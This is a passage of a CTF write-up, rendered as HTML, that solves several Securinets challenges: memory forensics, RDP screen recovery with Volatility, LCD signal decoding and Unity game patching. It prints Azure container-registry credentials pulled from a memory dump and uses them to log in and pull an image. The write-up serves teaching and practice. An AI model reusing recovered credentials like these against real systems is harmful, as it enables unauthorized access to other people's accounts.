class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei <span class=\"string\">&quot;@*:~\\\\$&quot;</span>     </span><br><span class=\"line\">raf-square@ubuntu:~$ vim /etc/containers/registries.conf</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">raf-square@ubuntu:~$ <span class=\"built_in\">echo</span> <span class=\"string\">&quot;This Is My Secret&quot;</span> &gt; secret.txt</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">raf-square@ubuntu:~$ podman login -u $(<span class=\"built_in\">head</span> -n 2 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>) -p $(<span class=\"built_in\">head</span> -n 3 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>)</span><br><span class=\"line\">raf-square@ubuntu:~$ podman pull nginx</span><br><span class=\"line\">^Craf-square@ubuntu:~$ <span class=\"built_in\">cd</span> LiME/src/</span><br><span class=\"line\">raf-square@ubuntu:~$ vim /etc/containers/registries.conf</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">raf-square@ubuntu:~$ vim /etc/containers/registries.conf</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">u:~$ podman login -u $(<span class=\"built_in\">head</span> -n 2 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>) -p $(<span class=\"built_in\">head</span> -n 3 secret.txt | <span class=\"built_in\">tail</span> -n 1 | awk <span class=\"string\">&#x27;&#123; print $4 &#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>Mmmm nice! now at least we got some commands and we got the user-name and host-name !<br>\nFrom these commands we can understand that the user edit  <code>/etc/containers/registries.conf</code> , then create a  <code>secret.txt</code> . Then logged in with podman using that secret.txt. But we don’t have any information about the content of the creds in these commands!.</p>\n<p>We have 2 methods to figure out what’s happen and get the creds!</p>\n<p>either running a strings and grepping on  <code>CMDLINE=podman login</code>  or grepping on  <code>This Is My Secret</code>  and check the lines before and after to see the content!</p>\n<figure class=\"highlight bash\"><figcaption><span>extract creds</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei <span class=\"string\">&quot;CMDLINE=podman login&quot;</span>       </span><br><span class=\"line\">_CMDLINE=podman login -u 2ecf92b1-83a8-4355-8cb7-8354f4677894 -p fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</span><br></pre></td></tr></table></figure>\n<p>OR</p>\n<figure class=\"highlight bash\"><figcaption><span>extract creds</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei -C 2 <span class=\"string\">&quot;This Is My Secret&quot;</span> </span><br><span class=\"line\"> Documents  LiME         Music     Public      Templates</span><br><span class=\"line\">Desktop  Downloads  Linux64.mem  Pictures  secret.txt  Videos</span><br><span class=\"line\">raf-square@ubuntu:~$ <span class=\"built_in\">echo</span> <span class=\"string\">&quot;This Is My Secret&quot;</span> &gt; secret.txt</span><br><span class=\"line\">raf-square@ubuntu:~$</span><br><span class=\"line\">fctt</span><br><span class=\"line\">--</span><br><span class=\"line\">application/octet-stream</span><br><span class=\"line\">text/plain</span><br><span class=\"line\">This Is My Secret</span><br><span class=\"line\">Service principal ID: 2ecf92b1-83a8-4355-8cb7-8354f4677894</span><br><span class=\"line\">Service principal password: fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</span><br><span class=\"line\">--</span><br></pre></td></tr></table></figure>\n<p>So the creds are  <code>2ecf92b1-83a8-4355-8cb7-8354f4677894:fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</code></p>\n<p>But I didn’t think this is a normal creds for  <code>dockerhub</code>  or any public famous container registry! Espacially he pulled a container named nginx! I bet that nginx is a customized one and its a trick!</p>\n<p>Editing  <code>/etc/containers/registries.conf</code>  can confirm that change something! This configuration file used by the container runtime environment on Linux systems. This file specifies a list of container image registries that are trusted by the system and can be used to download container images.</p>\n<p>So let’s discover how to get the registry! Pulling nginx means he pulled the latest tag or at least he tried that! So let’s grep on  <code>nginx:latest</code></p>\n<figure class=\"highlight bash\"><figcaption><span>extract registry</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings data.raw | grep -Ei <span class=\"string\">&quot;nginx:latest&quot;</span>  </span><br><span class=\"line\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span><br><span class=\"line\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span><br><span class=\"line\"><span class=\"string\">&quot;, &quot;</span>qualsk8s.azurecr.io/nginx:latest<span class=\"string\">&quot;) not found</span></span><br><span class=\"line\"><span class=\"string\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span></span><br><span class=\"line\"><span class=\"string\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span></span><br><span class=\"line\"><span class=\"string\">Trying to pull qualsk8s.azurecr.io/nginx:latest...</span></span><br></pre></td></tr></table></figure>\n<p>Bingo!  <code>qualsk8s.azurecr.io</code>  is the container registry! If you are an Azure guy you can get that from the previous step! when we get this output!</p>\n<figure class=\"highlight text\"><figcaption><span>creds</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Service principal ID: 2ecf92b1-83a8-4355-8cb7-8354f4677894</span><br><span class=\"line\">Service principal password: fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb</span><br></pre></td></tr></table></figure>\n<p>Ok it’s time to login and pull that image and run it!</p>\n<figure class=\"highlight bash\"><figcaption><span>login and pull</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker login qualsk8s.azurecr.io -u 2ecf92b1-83a8-4355-8cb7-8354f4677894 -p fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb </span><br><span class=\"line\"></span><br><span class=\"line\">docker pull nginx</span><br></pre></td></tr></table></figure>\n<p>After checking the image! I got that it’s a static web page so let’s run it!</p>\n<figure class=\"highlight bash\"><figcaption><span>run nginx</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run --name chall -p 80:80 -d nginx </span><br></pre></td></tr></table></figure>\n<p>After running this container we got this web-page and guess what!! There is a flag icon! Let’s check it !<br>\n<img data-src=\"https://i.imgur.com/q3GSPiL.png\" alt=\"\"></p>\n<p>This flag icon lead you to this link  <code>https://pastebin.com/vjFtjMga</code>  which is protected pastebin<br>\nhow to get that password now! Let’s check the docker history!</p>\n<figure class=\"highlight bash\"><figcaption><span>docker history</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mohamed@RafSquare:~$ docker <span class=\"built_in\">history</span> qualsk8s.azurecr.io/nginx</span><br><span class=\"line\">IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT</span><br><span class=\"line\">093f65335d3a   13 days ago   ENTRYPOINT [<span class=\"string\">&quot;nginx&quot;</span> <span class=\"string\">&quot;-g&quot;</span> <span class=\"string\">&quot;daemon off;&quot;</span>]         0B        buildkit.dockerfile.v0</span><br><span class=\"line\">&lt;missing&gt;      13 days ago   RUN /bin/sh -c <span class=\"built_in\">chmod</span> +r -R . <span class=\"comment\"># buildkit         563kB     buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      13 days ago   RUN /bin/sh -c <span class=\"built_in\">mv</span> password.txt .hidden.txt <span class=\"comment\">#…   11B       buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      13 days ago   COPY ./ ./ <span class=\"comment\"># buildkit                           563kB     buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      3 weeks ago   RUN /bin/sh -c <span class=\"built_in\">rm</span> -rf ./* <span class=\"comment\"># buildkit            0B        buildkit.dockerfile.v0</span></span><br><span class=\"line\">&lt;missing&gt;      3 weeks ago   WORKDIR /usr/share/nginx/html                   0B        buildkit.dockerfile.v0</span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"built_in\">set</span> -x     &amp;&amp; apkArch=<span class=\"string\">&quot;<span class=\"subst\">$(cat /etc…   29.2MB</span></span></span><br><span class=\"line\"><span class=\"subst\"><span class=\"string\">&lt;missing&gt;      5 weeks ago   /bin/sh -c #(nop)</span>  ENV NJS_VERSION=0.7.9        0B</span></span><br><span class=\"line\"><span class=\"string\">&lt;missing&gt;      5 weeks ago   /bin/sh -c #(nop)  CMD [&quot;</span>nginx<span class=\"string\">&quot; &quot;</span>-g<span class=\"string\">&quot; &quot;</span>daemon…   0B</span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  STOPSIGNAL SIGQUIT           0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  EXPOSE 80                    0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  ENTRYPOINT [&quot;/docker-entr…   0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:e57eef017a414ca7…   4.62kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:abbcbf84dc17ee44…   1.27kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:5c18272734349488…   2.12kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:7b307b62e82255f0…   1.62kB</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"built_in\">set</span> -x     &amp;&amp; addgroup -g 101 -S …   4.45MB</span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  ENV PKG_RELEASE=1            0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  ENV NGINX_VERSION=1.23.3     0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  LABEL maintainer=NGINX Do…   0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop)  CMD [&quot;/bin/sh&quot;]              0B</span></span><br><span class=\"line\">&lt;missing&gt;      5 weeks ago   /bin/sh -c <span class=\"comment\">#(nop) ADD file:40887ab7c06977737…   7.05MB</span></span><br></pre></td></tr></table></figure>\n<p>And yes!! There is  <code>.hidden.txt</code>  that contain a password for sure ! let’s get that password!</p>\n<figure class=\"highlight bash\"><figcaption><span>docker exec</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it 460fc5a977c5 <span class=\"built_in\">cat</span> .hidden.txt</span><br><span class=\"line\">vT56X19Qu3</span><br></pre></td></tr></table></figure>\n<p>We got this pastebin !</p>\n<p><img data-src=\"https://i.imgur.com/N4B9j4z.png\" alt=\"\"></p>\n<p>This is will lead us to word sheet that contains a hex data!</p>\n<p><img data-src=\"https://i.imgur.com/P0hrYhX.png\" alt=\"\"></p>\n<p>The hex data seams introducing spaces and tabs! I don’t care let’s decode it and see what’s will be!<br>\nI’ll try to convert it to a file using  <code>xxd</code>  and import that file to <span class=\"exturl\" data-url=\"aHR0cDovL2Rjb2RlLmZy\">dcode.fr</span></p>\n<figure class=\"highlight bash\"><figcaption><span>xxd</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxd -r -p hex.txt &gt; result.txt</span><br></pre></td></tr></table></figure>\n<p>Yeah it’s a file that contains a lot of spaces! Its whitespaces</p>\n<p>Bingo! This is the flag  <code>Securinets&#123;208e5976c9d654e47d73ef44cabc272d&#125;</code></p>\n<h1 id=\"digital-forensics-recover-my-work\"><a class=\"markdownIt-Anchor\" href=\"#digital-forensics-recover-my-work\">#</a> Digital Forensics: Recover my Work 😦</h1>\n<p><img data-src=\"https://i.imgur.com/DWMzUMB.png\" alt=\"\"></p>\n<p>We got a file named  <code>memory.dmp</code> . It’s a memory dump for sure! Let’s run imageinfo plugin to get our profile!</p>\n<figure class=\"highlight bash\"><figcaption><span>profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.dmp imageinfo</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br><span class=\"line\">WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow</span><br></pre></td></tr></table></figure>\n<p>But sadly we got this type of outpût! I bet that the suggested profile (in case it exists) will be wrong! Let’s know the exact profile with my own way! Let’s run strings the file and grep “service pack”</p>\n<figure class=\"highlight text\"><figcaption><span>Extract info</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows 7 Professional, 64-bit Service Pack 1 (Build 7601)</span><br></pre></td></tr></table></figure>\n<p>Cool, This build and service pack is supported by  <code>Win7SP1x64</code> ! I guess that imageinfo plugin got problem because the iso is customizated !</p>\n<p>Let’s start checking our memory dump! First thing should be checked is the running processes! I’ll use pstree for that thing!</p>\n<p><img data-src=\"https://i.imgur.com/1xA56pZ.png\" alt=\"\"></p>\n<p>MMMM intersting! Found chrome, firefox, outlook and RDP opened! what a trip! After digging on chrome history and firefox, I found rabbit holes and some links to wordlists! Bad Author (Me).</p>\n<p>Checking the consoles plugin too. Another rabbit hole! rabbit hole everywhere!</p>\n<p>It’s time to check and figure out that outlook process!<br>\nOutlook save the mails as pst or ost files! These files contains the mails data such as the message, attachements, sender/receiver information!</p>\n<p>So let’s try to extract these files !</p>\n<figure class=\"highlight bash\"><figcaption><span>check files</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.dmp --profile=Win7SP1x64 filescan | grep -i pst$</span><br><span class=\"line\">0x000000007d81a490      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Outlook.pst</span><br><span class=\"line\">0x000000007dd59340      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Work Progress.pst</span><br><span class=\"line\">0x000000007dd73220      1      0 R--rw- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Work Progress.pst</span><br><span class=\"line\">0x000000007e3f8b30      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Forgot the password.pst</span><br><span class=\"line\">0x000000007e5297a0      1      0 R--rw- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Forgot the password.pst</span><br><span class=\"line\">0x000000007e5eee60     30      0 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Outlook.pst</span><br></pre></td></tr></table></figure>\n<p>After extracting the files using  <code>dumpfiles</code>  plugin and making sure that the files are safe and not corrupted. I opened them using a pst online viewer!</p>\n<p>The 1st mail i got it is from Adam! He send to me a zip file inside mega storage after our online meeting! I bet that zip is protected with that boring password</p>\n<p><img data-src=\"https://i.imgur.com/9a0GCzz.png\" alt=\"\"></p>\n<p>Ah my bad! The mega too is protected! We need the encryption key!</p>\n<p><img data-src=\"https://i.imgur.com/hEG0dsu.png\" alt=\"\"></p>\n<p>Let’s check the other mail! and as expected Adam forget to share the decryption key of the mega link to open the zip!</p>\n<p><img data-src=\"https://i.imgur.com/wB3m3QV.png\" alt=\"\"></p>\n<p>Bingo we got the zip! But it’s protected! Tried bruteforcing the password. But I failed!</p>\n<p>Mmmm Let’s think a little bit! The author said that he used to use the same password! We need to find another usage of that password to open the zip and get the flag!</p>\n<p>And It’s time to investigate the  <code>mstsc.exe</code>  or let’s just say the RDP! Remote Desktop?? Mmmm how to extract information from that thing?</p>\n<p>Let’s talk brievly! Extracting the memory part used by RDP can save our life! I’ll try to recover what the user see when he used RDP!!!</p>\n<p>Yes this possible dear reader, Don’t worry You’ll see how! Just make sure that you have  <code>Gimp</code></p>\n<p>Let’s now extract the memory part used by RDP process using the  <code>memdump</code>  plugin in volatility!</p>\n<figure class=\"highlight bash\"><figcaption><span>memdump</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.dmp --profile=Win7SP1x64 memdump -p 360 -D .</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">************************************************************************</span><br><span class=\"line\">Writing mstsc.exe [   360] to 360.dmp</span><br></pre></td></tr></table></figure>\n<p>After getting that file! Let’s change its extension from  <code>.dmp</code>  to  <code>.data</code>  and open that file with gimp!</p>\n<p><img data-src=\"https://i.imgur.com/k3uwJ0M.png\" alt=\"\"></p>\n<p>Now it’s time for focusing! Yeah focusing will save your time! Many people can’t figure or recover images quickly! But believe me focusing on the noise will help you recover the data in a short time!</p>\n<p>After 4 mins of playing with offset and width i got it!</p>\n<p>Check the offset and the width!</p>\n<p><img data-src=\"https://i.imgur.com/wI2SQK7.png\" alt=\"\"></p>\n<p>Ohhh man! The user was opened <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuc2VjdXJpbmV0cy50bg==\">https://ctf.securinets.tn</span> (check it for know more information about our CTFs events xD ) and tried to secure a zip file with that shitty password!</p>\n<p>Finally This is the flag  <code>Securinets&#123;R3M0tE_DeSKtOp_1s_FunNy_!_!&#125;</code></p>\n<h1 id=\"hardware-liquid-display\"><a class=\"markdownIt-Anchor\" href=\"#hardware-liquid-display\">#</a> Hardware: Liquid Display</h1>\n<p><img data-src=\"https://i.imgur.com/YVrQJqG.png\" alt=\"\"></p>\n<p>We got an image and a data file!<br>\n<img data-src=\"https://i.imgur.com/5Enx08x.png\" alt=\"\"></p>\n<p>The image contains an LCD 16x2 SPI connected to something called  <code>WOKWI LOGIC</code></p>\n<p>After some searching I got that this component is a logic analyzer. But wait!! What is that??</p>\n<p>A logic analyzer is an electronic instrument that captures and displays multiple signals from a digital system or digital circuit. A logic analyzer may convert the captured data into timing diagrams, protocol decodes, state machine traces…</p>\n<p><img data-src=\"https://imgur.com/WEzP4bO.png\" alt=\"\"></p>\n<p>As my friend said this is the hardware wireshark xD</p>\n<p>So we can understand now that this circuit capture the signals of each pin of the LCD and the data file is the capture file that contains the files!</p>\n<p>So after some searching we get how to open that data file (which is a ASCII text file, I didn’t recommend to analyse it as text file).</p>\n<p>You can check this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLndva3dpLmNvbS9ndWlkZXMvbG9naWMtYW5hbHl6ZXI=\">link</span> to get more information about the logic analyzer!</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaWdyb2sub3JnL3dpa2kvRG93bmxvYWRz\">PulseView</span> is an open source Logic Analyzer GUI belongs to The sigrok project that aims at creating a portable, cross-platform, Free/Libre/Open-Source signal analysis software suite that supports various device types</p>\n<p>I’ll use that Logic Analyzer GUI for this challenge!</p>\n<p><img data-src=\"https://imgur.com/6HyLxUY.png\" alt=\"\"></p>\n<p>Import the file data in this way! and let’s the show begin!</p>\n<p><img data-src=\"https://imgur.com/MLrvWUk.png\" alt=\"\"></p>\n<p>A lot of fun wait us right?! Don’t worry man! This is not that super hard! Just all what we need to do now is to simulate these signals manually! These signals are sent to the LCD and that LCD display something (It should be the flag!). So we need to understand how LCD works! I recommend to read the datasheet this thing!</p>\n<p>I will not re-write what the datasheet said! so read it! You should understand how the LCD dispaly chars!</p>\n<p><img data-src=\"https://imgur.com/vnZLXyb.png\" alt=\"\"></p>\n<p>Also don’t forget to check the instruction table and understand how these instruction works!</p>\n<p><img data-src=\"https://imgur.com/xsRciDM.png\" alt=\"\"></p>\n<p>Let’s just take an example of the 1st instruction! The  <code>Clear Display</code> . This instruction clear all the data and return the cursor to the original status! Ah yeah of course you must to understand that LCD have cursors, display modes …</p>\n<p>After understand how this LCD works it’s time to check how characters are written on that LCD!</p>\n<p><img data-src=\"https://imgur.com/5JQEtHj.png\" alt=\"\"></p>\n<p>This table will help us to convert the signals to chars and recover our flag!</p>\n<p>After reading the datasheet. You will understand that the D0 (that correspond to RS pin) can help you to understand when the display device clear the chars and reset the cursor or write something on the screen!</p>\n<p><img data-src=\"https://imgur.com/QTfwCZC.png\" alt=\"\"></p>\n<p>If you take a closer look you’ll get it! The guy who write the program write something and clear it then write another thing then delete it and so on!<br>\n<img data-src=\"https://imgur.com/GSgaCKF.png\" alt=\"\"></p>\n<p>So now it’s time to check the write blocks and check what that guy try to do! After reversing all the block i got the flag! It’s on the last block! Let me show you how I recover that data!</p>\n<p><img data-src=\"https://imgur.com/HZcwRyX.png\" alt=\"\"></p>\n<p>Using the characters table you can recover the flag! Mapping the signal and the Big table lead you to the flag!</p>\n<p>And This is will be our flag!  <code>Securinets&#123;LcD_1s_H4rD_!:(&#125;</code></p>\n<h1 id=\"game-hacking-platformer\"><a class=\"markdownIt-Anchor\" href=\"#game-hacking-platformer\">#</a> Game Hacking: Platformer:</h1>\n<p><img data-src=\"https://imgur.com/OAyXmNQ.png\" alt=\"\"></p>\n<p>In this challenge we have a game made by unity! It’s 2D platformer game where the player can jump and run in the map! But where is the flag??<br>\n<img data-src=\"https://imgur.com/oIzwhG8.png\" alt=\"\"></p>\n<p>Mmmmm my sixth sense told me that the flag is hidden somewhere in the map and the player can’t reach it! Hack Time!!!</p>\n<p>Let’s change the player ability and let him can move in any place we want it. By disabling the collision and physics mechanism! Good bye gravitiy,Rigidbody,collisions!</p>\n<p>To do this let’s open  <code>Assembly-CSharp.dll</code>  located in  <code>Platformer_Data/Managed</code>  folder.</p>\n<p>Wow! This is the player controller code! that allow the player to move and the animation to be played and responsable for jumping and detect ground detection to deny player to jump many times on the air!</p>\n<p><img data-src=\"https://imgur.com/eD0vAq0.png\" alt=\"\"></p>\n<p>Boring mechanism!! Let me change this shitty code by mine! I’ll let the player move to any point he want!</p>\n<p><img data-src=\"https://imgur.com/DZqPB6p.png\" alt=\"\"><br>\nYou can copy that code</p>\n<figure class=\"highlight csharp\"><figcaption><span>change mechanism</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">Start</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.rb = <span class=\"keyword\">base</span>.GetComponent&lt;Rigidbody2D&gt;();</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.rb.isKinematic = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.anim = <span class=\"keyword\">base</span>.GetComponent&lt;Animator&gt;();</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.mySpriteRenderer = <span class=\"keyword\">base</span>.GetComponent&lt;SpriteRenderer&gt;();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Token: 0x06000005 RID: 5</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">FixedUpdate</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">float</span> axisRaw = Input.GetAxisRaw(<span class=\"string\">&quot;Horizontal&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">float</span> verticalInput = Input.GetAxisRaw(<span class=\"string\">&quot;Vertical&quot;</span>);</span><br><span class=\"line\">\tVector3 movement = <span class=\"keyword\">new</span> Vector3(axisRaw, verticalInput, <span class=\"number\">0f</span>).normalized * <span class=\"number\">10f</span> * Time.deltaTime;</span><br><span class=\"line\">\t<span class=\"keyword\">base</span>.transform.Translate(movement);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>After applying the changes our player can now go to any place we want! But i didn’t find the flag! Oh god! This is what i found!<br>\n<img data-src=\"https://imgur.com/6PRgDFo.png\" alt=\"\"></p>\n<p>I checked all the map and sadly nothing interesting 😦</p>\n<p>Let’s check the files again! Maybe we will find something!</p>\n<p><img data-src=\"https://imgur.com/MZ9tbCH.png\" alt=\"\"></p>\n<p>Oh man look here! I found that there is levels on this game! Let me back to the decompiled code!</p>\n<p><img data-src=\"https://imgur.com/yM0C7nL.png\" alt=\"\"></p>\n<p>Oh no! The game is opened on the 2nd level! Let’s change this room to “Level1” and Play again! And yes It’s a new Level</p>\n<p><img data-src=\"https://imgur.com/me4efrx.png\" alt=\"\"></p>\n<p>After moving right and left, I found the flag!</p>\n<p><img data-src=\"https://imgur.com/gj4wGE9.png\" alt=\"\"></p>\n<p>And Yes We did it! Just move right and left and collect the letters ! and you’ll get this one ! Wrap it in Securinets{}<br>\n<img data-src=\"https://imgur.com/cpA2O6c.png\" alt=\"\"></p>\n<p>Flag:  <code>Securinets&#123;Gam1ng_AnD_L0VE&#125;</code></p>\n<h1 id=\"misc-full-difference\"><a class=\"markdownIt-Anchor\" href=\"#misc-full-difference\">#</a> Misc: Full Difference</h1>\n<p><img data-src=\"https://imgur.com/dROW4SQ.png\" alt=\"\"></p>\n<p>Full Difference, The difference will make a difference! What is that thing ?? we got 2 images with different type but same picture!<br>\n<img data-src=\"https://imgur.com/dr87PxX.png\" alt=\"\"></p>\n<p>Thinking a little bit can we understand what the author means! Full difference! It means that the pixels should be different a full difference! which means the Red,Green and Blue channels should be differents!</p>\n<p>“Will make a difference!” After extracting the different pixels we should calculate the difference between each channels ?? Mmmmm makes sense!</p>\n<figure class=\"highlight python\"><figcaption><span>solver</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 